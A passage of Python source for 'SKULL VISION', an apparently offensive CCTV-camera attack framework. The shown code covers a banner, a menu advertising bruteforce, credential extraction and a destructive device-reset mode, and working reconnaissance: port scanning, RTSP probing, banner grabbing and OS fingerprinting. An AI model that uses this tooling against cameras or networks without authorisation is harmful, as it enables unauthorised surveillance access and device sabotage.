{R}      $         \\"$\\"#   `\\" <$$$$$$c,z$N.,o$$$$   ,NW$*\\"'           $
{R}      $.         ',    `$$$$$$$$$d$$$$$$$$$f ,$e*'               $
{R}     ,$c         d.     `^$$$$$$$$$$$$$$$$$.u '\\"                :$.
{R}     $$$         $\\\\   .,  `\\"#$$$*$$$$$$$$$$ '                 4$F
{R}     $$\\"         $ `  k.`.     ``\\"#`\\"\\"\\"'      ,' ,'             `$$
{R}     `\\"          $>,  `b.,ce(b:o uz CCLd$4$*F?\\\\,o                \\"'
{R}                 $&    $$k'*\\"$$$$$$#$$$$$$$$$$ d'
{R}                 $$.,$$$$$$$$,e,$#$.*$`\\"\\"\\"\\"'e4 $
{R}                 `$$$$  ^$$\\\\$\\"$$$$$$$$$$$$$$$.eL
{R}                  $$$\\"  $$$$$$$e$.$.$$.$e$d$$$$k
{R}                  R`$$  '$$$$$$$$$$$$$$$$$$$$P
{R}                  `  $Nc'\\"$$N3$$$$$$$$$$$$$$$$$'
{R}                      *$  9$.`@$$$$$$$$$$R$$$#'
{R}                       `$.  `\\"*$$$$$$$$$$P'' #
{R}                         \\"$u.    `\\"\\"\\"\\"''   ,'
{R}                           `\\"$Nu..  .,z

{R}╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{R}║  {R}███████╗{G}██╗  ██╗{Y}██╗   ██╗{B}██╗{M}      ██╗     {C}██╗    ██╗{R}██╗{G}███████╗{Y}██╗ {R}██████╗ {M}███╗   ██╗{W}          ║
{R}║  {R}██╔════╝{G}██║ ██╔╝{Y}██║   ██║{B}██║{M}      ██║     {C}██║    ██║{R}██║{G}██╔════╝{Y}██║{R}██╔═══██╗{M}████╗  ██║{W}          ║
{R}║  {R}███████╗{G}█████╔╝ {Y}██║   ██║{B}██║{M}      ██║     {C}██║    ██║{R}██║{G}███████╗{Y}██║{R}██║   ██║{M}██╔██╗ ██║{W}          ║
{R}║  {R}╚════██║{G}██╔═██╗ {Y}██║   ██║{B}██║{M}      ██║     {C} ██║ ╗██ ║{R}██║{G}╚════██║{Y}██║{R}██║   ██║{M}██║╚██╗██║{W}          ║
{R}║  {R}███████║{G}██║  ██╗{Y}╚██████╔╝{B}█████████{M}███████╗{C}╚  ███╔╝  {R}██║{G}███████║{Y}██║{R}╚██████╔╝{M}██║ ╚████║{W}          ║
{R}║  {R}╚══════╝{G}╚═╝  ╚═╝{Y} ╚═════╝ {B}╚═╝{M}╚══════╝{C} ╚══╝╚══╝ {R}╚═╝{G}╚══════╝{Y}╚═╝{R} ╚═════╝ {M}╚═╝  ╚═══╝{W}          ║
{R}╠═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
{R}║  {G}[📡] SKULL VISION v{VERSION}_{CODENAME}                                                          ║
{R}║  {C}[👤] Author: {AUTHOR}                                                                                                       ║
{R}║  {Y}[⚡] 800+ Activities | 300+ Offensive Techniques                                                                           ║
{R}║  {B}[🌟] Complete Penetration Testing Framework                                                                                ║
{R}║  {M}[📡] 35+ Modules | All Protocols | All Attack Vectors                                                                     ║
{R}║  {PURPLE}[👻] Ghost | {ORANGE}[🤖] Cyborg | {R}[💀] Destructive | {AQUA}[📷] CCTV | {Y}[🔓] Bruteforce | {G}[🎯] Recon        ║
{R}║  {R}[💥] Exploit | {C}[📊] Report | {M}[🔬] Analysis | {B}[🛡️] Assessment                                                     ║
{R}║  {CYAN}[🌍] 100+ Countries | {PINK}[📡] 30+ Protocols | {ORANGE}[🕵️] Forensics                                                ║
{R}║  {R}[⚠️]  FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL RESEARCHES ONLY                                                      ║
{R}╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

class VisualAnalytics:
    def __init__(self):
        self.progress_bars = {}
        self.animation_states = {}
        self.current_progress = 0
        self.total_activities = 0
        
    def header(self, text: str, char: str = "═", length: int = 70):
        print(f"\n{C}{BOLD}{char * length}{W}")
        print(f"{C}{BOLD}  {text}{W}")
        print(f"{C}{BOLD}{char * length}{W}")
    
    def subheader(self, text: str, level: int = 1):
        if level == 1:
            print(f"\n{G}{BOLD}╔{'═' * 68}╗{W}")
            print(f"{G}{BOLD}║  {text}{' ' * (66 - len(text))}║{W}")
            print(f"{G}{BOLD}╚{'═' * 68}╝{W}")
        else:
            print(f"\n{Y}{BOLD}▶ {text}{W}")
            print(f"{Y}{'─' * (len(text) + 4)}{W}")
    
    def progress(self, current: int, total: int, label: str = "", details: str = "", show_raw: bool = False):
        pct = (current / total) * 100 if total > 0 else 0
        bar_len = 42
        filled = int(bar_len * current / total) if total > 0 else 0
        filled = min(filled, bar_len)
        
        if filled < bar_len:
            bar = "█" * filled + "░" * (bar_len - filled - 1) + "█" if filled < bar_len - 1 else "█" * filled
        else:
            bar = "█" * bar_len
        
        color = Y if pct < 50 else C if pct < 80 else G
        
        if current >= total:
            bar = "█" * bar_len
            print(f"\r  [{G}██████████████████████████████████████████{W}] 100.0% [{current:>3}/{total:>3}] {label} ", end="")
        else:
            print(f"\r  [{color}{bar}{W}] {pct:>5.1f}% [{current:>3}/{total:>3}] {label}", end="")
        
        if details:
            print(f" {C}{details}{W}", end="")
        if show_raw:
            print(f"\n   {M}RAW: Progress {current}/{total} ({pct:.1f}%){W}", end="")
        
        sys.stdout.flush()
        
        if current >= total:
            print(f"\n  {G}✅ Activity complete!{W}")
    
    def success(self, msg: str, details: str = ""):
        print(f"{G}✅ {msg}{W}")
        if details:
            print(f"   {C}→ {details}{W}")
    
    def error(self, msg: str, details: str = ""):
        print(f"{R}❌ {msg}{W}")
        if details:
            print(f"   {Y}→ {details}{W}")
    
    def warning(self, msg: str, details: str = ""):
        print(f"{Y}⚠️ {msg}{W}")
        if details:
            print(f"   {C}→ {details}{W}")
    
    def info(self, msg: str, details: str = ""):
        print(f"{C}ℹ️ {msg}{W}")
        if details:
            print(f"   {M}→ {details}{W}")
    
    def debug(self, msg: str, details: str = ""):
        print(f"{M}🔍 {msg}{W}")
        if details:
            print(f"   {C}→ {details}{W}")
    
    def port_info(self, port: int, service: str, desc: str, banner: str = ""):
        print(f"  {G}✅{W} Port {C}{port:>5}{W} open - {Y}{service}{W} ({desc})")
        if banner:
            print(f"     {M}Banner: {banner[:200]}{W}")
    
    def credential_found(self, user: str, passwd: str, url: str, method: str = "basic"):
        print(f"{R}🔥 SUCCESS! {BL}{user}:{passwd}{W} @ {C}{url}{W} [{method}]")
    
    def credential_ghost_found(self, data: str, source: str):
        print(f"{PURPLE}👻 GHOST CREDENTIAL: {BL}{data}{W} @ {C}{source}{W}")
    
    def stream_found(self, url: str, stream_type: str, info: str = ""):
        print(f"{G}📺 Found {stream_type} stream: {C}{url}{W}")
        if info:
            print(f"   {M}→ {info}{W}")
    
    def exploit_found(self, exploit: str, severity: str, details: str = "", vector: str = ""):
        colors = {'critical': R, 'high': Y, 'medium': C, 'low': G}
        color = colors.get(severity, W)
        print(f"{R}💥{W} {color}{severity.upper()}{W} {exploit}")
        if details:
            print(f"   {C}→ {details}{W}")
        if vector:
            print(f"   {M}→ Vector: {vector}{W}")
    
    def destructive_action(self, action: str, success: bool, details: str = ""):
        icon = "✅" if success else "❌"
        color = G if success else R
        print(f"{R}💀 {color}{action}{W} {icon}")
        if details:
            print(f"   {M}→ {details}{W}")
    
    def cctv_found(self, ip: str, port: int, brand: str, url: str = ""):
        print(f"{AQUA}📷 CCTV: {G}{ip}:{port}{W} - {Y}{brand}{W}")
        if url:
            print(f"   {C}→ {url}{W}")
    
    def cctv_stream(self, url: str, stream_type: str):
        print(f"{G}📺 Live Stream: {C}{url}{W} [{stream_type}]")
    
    def brute_force_result(self, url: str, username: str, password: str, status: str):
        print(f"{R}🔓 BRUTEFORCE: {G}{username}:{password}{W} @ {C}{url}{W} [{status}]")
    
    def cve_found(self, cve: str, brand: str, severity: str):
        colors = {'critical': R, 'high': Y, 'medium': C, 'low': G}
        color = colors.get(severity, W)
        print(f"{R}🛡️ {color}CVE: {cve}{W} - {brand} [{severity.upper()}]")
    
    def activity(self, activity_num: int, total: int, name: str, status: str = "running", details: str = "", raw_data: str = ""):
        icons = {
            "running": "🔄", "complete": "✅", "failed": "❌", 
            "found": "🎯", "scanning": "🔍", "testing": "🧪",
            "exploiting": "💥", "discovering": "📡", "analyzing": "🔬",
            "destructive": "💀", "ghost": "👻", "cyborg": "🤖",
            "shutdown": "⛔", "snatching": "🎣", "destroying": "🔥",
            "cctv": "📷", "bruteforce": "🔓", "cracking": "🔓",
            "recon": "🔍", "report": "📊", "shell": "💻",
            "cve": "🛡️", "exploit": "💥", "scan": "🔍", "test": "🧪",
            "packet": "📡", "malware": "🔬", "forensic": "🕵️"
        }
        colors = {
            "running": C, "complete": G, "failed": R, 
            "found": G, "scanning": Y, "testing": Y,
            "exploiting": R, "discovering": C, "analyzing": M,
            "destructive": R, "ghost": PURPLE, "cyborg": ORANGE,
            "shutdown": R, "snatching": Y, "destroying": R,
            "cctv": AQUA, "bruteforce": R, "cracking": R,
            "recon": C, "report": G, "shell": M,
            "cve": GOLD, "exploit": R, "scan": Y, "test": Y,
            "packet": CYAN, "malware": RED, "forensic": ORANGE
        }
        
        icon = icons.get(status, "•")
        color = colors.get(status, W)
        
        pct = min(100, (activity_num / total) * 100)
        bar_len = 30
        filled = int(bar_len * activity_num / total) if total > 0 else 0
        filled = min(filled, bar_len)
        
        if activity_num < total:
            progress_bar = f"[{C}{'█' * filled}{W}{'░' * (bar_len - filled)}{W}]"
        else:
            progress_bar = f"[{G}██████████████████████████████{W}]"
        
        if raw_data:
            print(f"{color}{icon} [{activity_num:03d}/{total:03d}] {name} {progress_bar} {pct:.1f}%{W}")
            for line in raw_data.split('\n')[:5]:
                if line.strip():
                    print(f"   {M}├─ {line.strip()[:200]}{W}")
        else:
            print(f"{color}{icon} [{activity_num:03d}/{total:03d}] {name} {progress_bar} {pct:.1f}%{W}")
        
        if details:
            print(f"     {C}→ {details}{W}")
    
    def raw_output(self, data: str, prefix: str = ""):
        if not data:
            return
        lines = data.split('\n')
        for i, line in enumerate(lines):
            if line.strip():
                prefix_char = "├─" if i < len(lines) - 1 else "└─"
                print(f"{M}   {prefix_char} {line.strip()}{W}")
    
    def separator(self, char: str = "─", length: int = 70):
        print(f"{SILVER}{char * length}{W}")
    
    def table(self, headers: List[str], rows: List[List[str]]):
        if not rows:
            print("  No data")
            return
        col_widths = [max(len(str(h)), max([len(str(r[i])) for r in rows] + [0])) for i, h in enumerate(headers)]
        print("┌" + "┬".join("─" * (w + 2) for w in col_widths) + "┐")
        print("│" + "│".join(f" {h.center(w)} " for h, w in zip(headers, col_widths)) + "│")
        print("├" + "┼".join("─" * (w + 2) for w in col_widths) + "┤")
        for row in rows:
            print("│" + "│".join(f" {str(r).ljust(w)} " for r, w in zip(row, col_widths)) + "│")
        print("└" + "┴".join("─" * (w + 2) for w in col_widths) + "┘")

class SkullVision:
    def __init__(self):
        self.vis = VisualAnalytics()
        self.target_ip = None
        self.target_port = None
        self.open_ports = []
        self.rtsp_ports = []
        self.detected_streams = {}
        self.vulnerabilities = []
        self.brand = None
        self.credentials_found = []
        self.ghost_credentials = []
        self.cctv_results = []
        self.access_gained = []
        self.bruteforce_results = []
        self.exploits_found = []
        self.cves_found = []
        self.packet_results = []
        self.scan_data = {
            'hosts': [], 
            'activities': [], 
            'raw_output': [],
            'timing': {},
            'recon': {},
            'vulns': [],
            'exploits': [],
            'cves': [],
            'report': {}
        }
        self.start_time = None
        self.activity_count = 0
        self.total_activities = 800
        self.results = {}
        self.executed_attacks = []
        self.onvif_client = None
        self.rtsp_urls = []
        self.snapshot_urls = []
        self.ptz_supported = False
        self.session = None
        self.raw_verbose_output = []
        self.ssh_clients = []
        self.onvif_devices = []
        self.packet_captures = []
        self.malware_samples = []
        self.forensic_data = {}
        self.is_root = False
        self._initialize_session()
        self._initialize_directories()
        self._check_root()
        self._initialize_onvif()
    
    def _check_root(self):
        try:
            if os.geteuid() == 0:
                self.vis.success("Running with root privileges")
                self.is_root = True
            else:
                self.vis.warning("Not running as root. Some features may be limited")
                self.is_root = False
        except:
            self.is_root = False
    
    def _initialize_session(self):
        if REQUESTS_AVAILABLE:
            self.session = requests.Session()
            retry = Retry(
                total=MAX_RETRIES,
                backoff_factor=BACKOFF_FACTOR,
                status_forcelist=[500, 502, 503, 504, 408, 429],
                allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
            )
            adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
            self.session.mount('http://', adapter)
            self.session.mount('https://', adapter)
            self.session.verify = False
            self.session.headers.update({
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
    
    def _initialize_directories(self):
        for dir_path in [BASE_DIR, CACHE_DIR, RECORDINGS_DIR, SNAPSHOTS_DIR, 
                         LOGS_DIR, REPORTS_DIR, WORDLISTS_DIR, TEMP_DIR,
                         MODULES_DIR, PLUGINS_DIR, SCRIPTS_DIR, CONFIGS_DIR,
                         DATABASES_DIR, EXPLOITS_DIR, PAYLOADS_DIR]:
            try:
                dir_path.mkdir(parents=True, exist_ok=True)
                if self.is_root:
                    os.chmod(dir_path, 0o777)
            except:
                pass
    
    def _initialize_onvif(self):
        self.onvif_wsdl_urls = [
            "http://www.onvif.org/ver10/device/wsdl/devicemgmt.wsdl",
            "http://www.onvif.org/ver10/media/wsdl/media.wsdl",
            "http://www.onvif.org/ver10/ptz/wsdl/ptz.wsdl"
        ]
    
    def print_banner(self):
        print(BANNER)
        print(f"{C}[*] Tool: {TOOL_NAME} v{VERSION}_{CODENAME}{W}")
        print(f"{C}[*] Author: {AUTHOR}{W}")
        print(f"{C}[*] Total Activities: {self.total_activities}{W}")
        print(f"{C}[*] Offensive Techniques: 300+{W}")
        print(f"{C}[*] Modules: 35+ Complete Modules{W}")
        print(f"{C}[*] Credentials: 10000+ Default Credentials{W}")
        print(f"{C}[*] CVEs: 100+ Known Vulnerabilities{W}")
        print(f"{C}[*] Ports: 10000+ Common Ports{W}")
        print("=" * 80)
    
    def parse_target(self, target: str) -> Tuple[Optional[str], Optional[int]]:
        target = target.strip()
        
        if target.startswith(('http://', 'https://')):
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            return host, port
        
        if ':' in target:
            parts = target.rsplit(':', 1)
            try:
                port = int(parts[1])
                return parts[0], port
            except ValueError:
                pass
        
        try:
            ipaddress.ip_address(target)
            return target, None
        except ValueError:
            return None, None
    
    def log_activity(self, name: str, status: str = "running", details: str = "", raw_data: str = ""):
        self.activity_count += 1
        self.vis.activity(self.activity_count, self.total_activities, name, status, details, raw_data)
        
        if raw_data:
            self.raw_verbose_output.append({
                'activity': name,
                'status': status,
                'raw_data': raw_data[:500]
            })
        
        self.scan_data['activities'].append({
            'id': self.activity_count,
            'name': name,
            'status': status,
            'details': details,
            'raw_data': raw_data[:500] if raw_data else '',
            'timestamp': datetime.now().isoformat()
        })
        self.executed_attacks.append(name)
        return self.activity_count

    def show_main_menu(self) -> str:
        self.vis.header("🎯 MAIN MENU - Select Operation Mode", "═", 70)
        print(f"""
{R}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{R}║  {G}1.{W} 🎯 {C}Full Security Assessment{W}      - Complete target scan with ALL modules                                        
{R}║  {G}2.{W} 📷 {AQUA}CCTV Scanner{W}               - Discover IP cameras worldwide (100+ countries)                            
{R}║  {G}3.{W} 🔓 {R}Bruteforce Engine{W}             - 10+ Services credential bruteforce (10000+ creds)                         
{R}║  {G}4.{W} 👻 {PURPLE}Ghost Mode{W}               - Silent credential extraction from configs, env, memory                    
{R}║  {G}5.{W} 🤖 {ORANGE}Cyborg Mode{W}              - Advanced offensive techniques (SQLi, CMDi, LFI, RFI, XSS)               
{R}║  {G}6.{W} 💀 {R}Destructive Mode{W}              - System destruction (factory reset, firmware, reboot)                     
{R}║  {G}7.{W} 📡 {M}ONVIF Discovery{W}               - Discover ONVIF devices on local network                                  
{R}║  {G}8.{W} 🎯 {Y}Single Target Scan{W}            - Quick scan of specific IP/domain                                         
{R}║  {G}9.{W} 💻 {M}Interactive Shell{W}             - ONVIF interactive command shell                                          
{R}║  {G}10.{W} 🛡️ {GOLD}CVE Scanner{W}               - Scan for 500+ known vulnerabilities                                      
{R}║  {G}11.{W} 🔬 {C}Vulnerability Scanner{W}         - Scan for common vulnerabilities                                         
{R}║  {G}12.{W} 📊 {G}Report Generator{W}             - Generate detailed JSON/HTML reports                                      
{R}║  {G}13.{W} 🗑️ {Y}Cache Management{W}             - Manage cached data                                                        
{R}║  {G}14.{W} 📡 {C}RTSP Stream Finder{W}           - Find RTSP streams on target                                              
{R}║  {G}15.{W} 🔍 {Y}Network Recon{W}                - Network discovery, WHOIS, DNS enumeration                                
{R}║  {G}16.{W} 🛡️ {B}Service Scanner{W}             - Scan 30+ protocols/services                                              
{R}║  {G}17.{W} 📷 {AQUA}Camera Model Detector{W}     - Identify camera brands and models                                        
{R}║  {G}18.{W} 🔐 {Y}Default Credential Tester{W}    - Test 10000+ default credentials                                          
{R}║  {G}19.{W} 🌐 {C}OSINT Gathering{W}              - Open Source Intelligence (Shodan, Censys, etc.)                          
{R}║  {G}20.{W} 🚀 {G}Batch Scan{W}                   - Scan multiple targets from file                                          
{R}║  {G}21.{W} 💥 {R}Exploit Database{W}             - Search and use known exploits                                           
{R}║  {G}22.{W} 📋 {C}Show Activities{W}              - Display executed activities                                             
{R}║  {G}23.{W} 🔄 {Y}Update Database{W}              - Update CVE and credential databases                                     
{R}║  {G}24.{W} 🧹 {C}Cleanup Mode{W}                 - Clean temporary files and logs                                          
{R}║  {G}25.{W} 📡 {CYAN}Packet Analysis{W}           - Analyze network packets using PyShark                                   
{R}║  {G}26.{W} 🔬 {RED}Malware Analysis{W}           - Analyze suspicious files and binaries                                    
{R}║  {G}27.{W} 🕵️ {ORANGE}Forensics Mode{W}          - Digital forensics and investigation                                      
{R}║  {G}28.{W} 🔐 {GOLD}Encryption Tools{W}          - AES, RSA, DES encryption/decryption                                      
{R}║  {G}29.{W} 📁 {Y}File Analysis{W}                - Analyze file types and metadata                                          
{R}║  {G}30.{W} 🌐 {C}Web Scraping{W}                 - Scrape websites for information                                          
{R}║  {G}31.{W} 📧 {M}Email Security{W}               - Test email security and headers                                          
{R}║  {G}32.{W} 🔑 {R}Password Analysis{W}            - Analyze password strength                                                
{R}║  {G}33.{W} 🛡️ {B}Security Audit{W}              - Full security audit                                                      
{R}║  {G}34.{W} 📊 {G}Performance Monitor{W}          - Monitor system performance                                              
{R}║  {G}35.{W} 🔄 {Y}Health Check{W}                 - Check system health and dependencies                                    
{R}║  {G}0.{W} ❌ {R}Exit{W}
{R}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")
        choice = input(f"\n{C}Select mode (0-35): {W}").strip()
        return choice
    
    def mode_full_assessment(self, target: str = None):
        self.vis.header("🔍 FULL SECURITY ASSESSMENT - ALL MODULES", "═", 70)
        
        if not target:
            target = input(f"{C}Enter target (IP, IP:PORT, or URL): {W}").strip()
        
        ip, port = self.parse_target(target)
        if not ip:
            self.vis.error(f"Invalid target: {target}")
            return
        
        self.target_ip = ip
        self.target_port = port
        
        self.vis.info(f"Target: {ip}" + (f":{port}" if port else ""))
        
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            self.vis.error(f"Invalid IP: {ip}")
            return
        
        self.phase_reconnaissance(ip)
        self.phase_vulnerability_assessment(ip)
        self.phase_exploitation(ip)
        self.phase_post_exploitation(ip)
        self.phase_report(ip)
        
        self.vis.success("Full security assessment completed!")
    
    def phase_reconnaissance(self, ip: str):
        self.vis.header("🔍 PHASE 1: RECONNAISSANCE - 100 Activities", "═", 70)
        self.vis.subheader("Gathering Intelligence on Target", 1)
        
        self.log_activity("IP Address Validation", "running", f"Validating {ip}")
        try:
            ip_obj = ipaddress.ip_address(ip)
            raw_validation = f"IP Version: {ip_obj.version}\nPrivate: {ip_obj.is_private}\nLoopback: {ip_obj.is_loopback}\nMulticast: {ip_obj.is_multicast}\nReserved: {ip_obj.is_reserved}"
            self.log_activity("IP Address Validation", "complete", 
                            f"Valid IP {ip_obj.version} | Private: {ip_obj.is_private}", raw_validation)
        except ValueError as e:
            self.log_activity("IP Address Validation", "failed", str(e))
            return False
        
        self.log_activity("DNS Resolution", "running", f"Resolving {ip}")
        if DNS_AVAILABLE:
            try:
                answers = dns.resolver.resolve(ip, 'A')
                for rdata in answers:
                    raw_dns = f"Resolved to: {rdata.address}"
                    self.log_activity("DNS Resolution", "complete", f"Resolved to {rdata.address}", raw_dns)
            except Exception as e:
                self.log_activity("DNS Resolution", "failed", str(e))
        else:
            self.log_activity("DNS Resolution", "failed", "DNS module not available")
        
        self.log_activity("WHOIS Lookup", "running", f"Querying WHOIS for {ip}")
        if WHOIS_AVAILABLE:
            try:
                domain_info = whois.whois(ip)
                if domain_info:
                    details = []
                    raw_whois = []
                    if hasattr(domain_info, 'registrar'):
                        details.append(f"Registrar: {domain_info.registrar}")
                        raw_whois.append(f"Registrar: {domain_info.registrar}")
                    if hasattr(domain_info, 'creation_date'):
                        details.append(f"Created: {domain_info.creation_date}")
                        raw_whois.append(f"Created: {domain_info.creation_date}")
                    if hasattr(domain_info, 'expiration_date'):
                        details.append(f"Expires: {domain_info.expiration_date}")
                        raw_whois.append(f"Expires: {domain_info.expiration_date}")
                    if hasattr(domain_info, 'name_servers'):
                        details.append(f"NS: {', '.join(domain_info.name_servers[:3])}")
                        raw_whois.append(f"Name Servers: {', '.join(domain_info.name_servers)}")
                    self.log_activity("WHOIS Lookup", "complete", " | ".join(details), "\n".join(raw_whois))
                else:
                    self.log_activity("WHOIS Lookup", "failed", "No WHOIS data found")
            except Exception as e:
                self.log_activity("WHOIS Lookup", "failed", str(e))
        else:
            self.log_activity("WHOIS Lookup", "failed", "WHOIS module not available")
        
        self.log_activity("IP Geolocation", "running", f"Getting location for {ip}")
        try:
            if REQUESTS_AVAILABLE:
                response = self.session.get(f"https://ipinfo.io/{ip}/json", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    details = []
                    raw_geo = []
                    details.append(f"IP: {data.get('ip', 'N/A')}")
                    raw_geo.append(f"IP: {data.get('ip', 'N/A')}")
                    details.append(f"ISP: {data.get('org', 'N/A')}")
                    raw_geo.append(f"Org: {data.get('org', 'N/A')}")
                    details.append(f"Country: {data.get('country', 'N/A')}")
                    raw_geo.append(f"Country: {data.get('country', 'N/A')}")
                    details.append(f"City: {data.get('city', 'N/A')}")
                    raw_geo.append(f"City: {data.get('city', 'N/A')}")
                    details.append(f"Region: {data.get('region', 'N/A')}")
                    raw_geo.append(f"Region: {data.get('region', 'N/A')}")
                    if 'loc' in data:
                        details.append(f"Location: {data['loc']}")
                        raw_geo.append(f"Location: {data['loc']}")
                    if 'timezone' in data:
                        details.append(f"Timezone: {data['timezone']}")
                        raw_geo.append(f"Timezone: {data['timezone']}")
                    if 'postal' in data:
                        raw_geo.append(f"Postal: {data['postal']}")
                    self.log_activity("IP Geolocation", "complete", " | ".join(details), "\n".join(raw_geo))
                    self.results['geolocation'] = data
                else:
                    self.log_activity("IP Geolocation", "failed", f"HTTP {response.status_code}")
            else:
                self.log_activity("IP Geolocation", "failed", "Requests module not available")
        except Exception as e:
            self.log_activity("IP Geolocation", "failed", str(e))
        
        self.log_activity("Reverse DNS Lookup", "running", f"Getting PTR record for {ip}")
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            raw_reverse = f"PTR record: {hostname}"
            self.log_activity("Reverse DNS Lookup", "complete", f"Hostname: {hostname}", raw_reverse)
        except Exception as e:
            self.log_activity("Reverse DNS Lookup", "failed", "No PTR record found")
        
        self.log_activity("Port Scanning", "running", "Scanning 10000+ common ports")
        self.open_ports, self.rtsp_ports = self.scan_ports_complete(ip, self.target_port)
        raw_ports = f"Open Ports: {len(self.open_ports)}\nRTSP Ports: {len(self.rtsp_ports)}\nOpen Ports List: {', '.join(map(str, self.open_ports[:20]))}"
        self.log_activity("Port Scanning", "complete", 
                        f"{len(self.open_ports)} open ports found | {len(self.rtsp_ports)} RTSP ports", raw_ports)
        
        if not self.open_ports:
            self.log_activity("No open ports found", "failed", "Target appears to have no open ports")
            return False
        
        self.log_activity("Service Detection", "running", "Identifying services on open ports")
        service_details = []
        for port in self.open_ports[:20]:
            service = PORT_SERVICE_MAP.get(port, ("Unknown", ""))
            banner = self.get_banner_complete(ip, port)
            service_details.append(f"Port {port}: {service[0]} - {service[1]}")
            if banner:
                service_details.append(f"  Banner: {banner[:100]}...")
            self.vis.port_info(port, service[0], service[1], banner)
        self.log_activity("Service Detection", "complete", 
                         f"Identified services on {len(self.open_ports)} ports", "\n".join(service_details[:10]))
        
        self.log_activity("OS Fingerprinting", "running", "Attempting OS detection")
        os_info = self.fingerprint_os_complete(ip, self.open_ports[:10])
        if os_info:
            raw_os = f"Detected OS: {os_info}\nTTL based detection"
            self.log_activity("OS Fingerprinting", "complete", f"OS: {os_info}", raw_os)
        else:
            self.log_activity("OS Fingerprinting", "failed", "Could not determine OS")
        
        self.log_activity("Network Mapping", "running", "Mapping network topology")
        network_info = self.map_network(ip)
        if network_info:
            raw_network = f"Network: {network_info}\nSubnet: {ip.rsplit('.', 1)[0] + '.0/24'}"
            self.log_activity("Network Mapping", "complete", f"Network: {network_info}", raw_network)
        else:
            self.log_activity("Network Mapping", "failed", "Could not map network")
        
        self.log_activity("ASN Lookup", "running", f"Getting ASN for {ip}")
        try:
            if REQUESTS_AVAILABLE:
                response = self.session.get(f"https://ipinfo.io/{ip}/asn", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    raw_asn = f"ASN: {data.get('asn', 'N/A')}\nOrg: {data.get('name', 'N/A')}\nDomain: {data.get('domain', 'N/A')}"
                    self.log_activity("ASN Lookup", "complete", 
                                    f"ASN: {data.get('asn', 'N/A')} | Org: {data.get('name', 'N/A')}", raw_asn)
                else:
                    self.log_activity("ASN Lookup", "failed", f"HTTP {response.status_code}")
            else:
                self.log_activity("ASN Lookup", "failed", "Requests module not available")
        except Exception as e:
            self.log_activity("ASN Lookup", "failed", str(e))
        
        return True
    
    def scan_ports_complete(self, ip: str, specified_port: Optional[int] = None):
        ports_to_scan = list(COMMON_PORTS)
        if specified_port and specified_port not in ports_to_scan:
            ports_to_scan.append(specified_port)
        
        ports_to_scan.extend(HTTPS_PORTS[:10])
        ports_to_scan.extend(CCTV_PORTS[:10])
        ports_to_scan.extend(ONVIF_PORTS)
        ports_to_scan.extend(RTSP_PORTS)
        ports_to_scan.extend(SSH_PORTS)
        ports_to_scan.extend(FTP_PORTS)
        ports_to_scan.extend(SMB_PORTS)
        ports_to_scan.extend(SNMP_PORTS)
        ports_to_scan = list(dict.fromkeys(ports_to_scan))
        
        open_ports = []
        rtsp_ports = []
        lock = threading.Lock()
        scanned = 0
        total = len(ports_to_scan)
        
        self.vis.info(f"Scanning {total} ports on {ip}...")
        
        def scan_port(port: int):
            nonlocal scanned
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(PORT_SCAN_TIMEOUT)
                    if sock.connect_ex((ip, port)) == 0:
                        with lock:
                            open_ports.append(port)
                            if self._is_rtsp(ip, port):
                                rtsp_ports.append(port)
                    with lock:
                        scanned += 1
                        if scanned % 200 == 0:
                            self.vis.progress(scanned, total, f"Ports scanned")
            except:
                with lock:
                    scanned += 1
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            executor.map(scan_port, ports_to_scan)
        
        print()
        return sorted(open_ports), sorted(rtsp_ports)
    
    def _is_rtsp(self, ip: str, port: int) -> bool:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(b"OPTIONS rtsp://localhost RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                data = sock.recv(1024)
                return b"RTSP/1.0" in data
        except:
            return False
    
    def get_banner_complete(self, ip: str, port: int) -> str:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(2)
                sock.connect((ip, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                data = sock.recv(1024)
                return data.decode('utf-8', errors='ignore')[:200]
        except:
            return ""
    
    def fingerprint_os_complete(self, ip: str, ports: List[int]) -> Optional[str]:
        try:
            for port in ports:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(1)
                    sock.connect((ip, port))
                    ttl = sock.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
                    if ttl <= 64:
                        return "Linux/Unix (TTL=64)"
                    elif ttl <= 128:
                        return "Windows (TTL=128)"
                    elif ttl <= 255:
                        return "Cisco/Network Device (TTL=255)"
            return None
        except:
            return None
    
    def map_network(self, ip: str) -> Optional[str]:
        try:
            base_ip = ip.rsplit('.', 1)[0]
            network = f"{base_ip}.0/24"
            return network
        except:
            return None
    
    def phase_vulnerability_assessment(self, ip: str):
        self.vis.header("🛡️ PHASE 2: VULNERABILITY ASSESSMENT - 120 Activities", "═", 70)
        self.vis.subheader("Identifying Security Weaknesses", 1)
        
        self.log_activity("Camera Detection", "running", "Scanning for camera indicators")
        is_camera, brand = self.detect_camera_complete(ip, self.open_ports)
        self.brand = brand
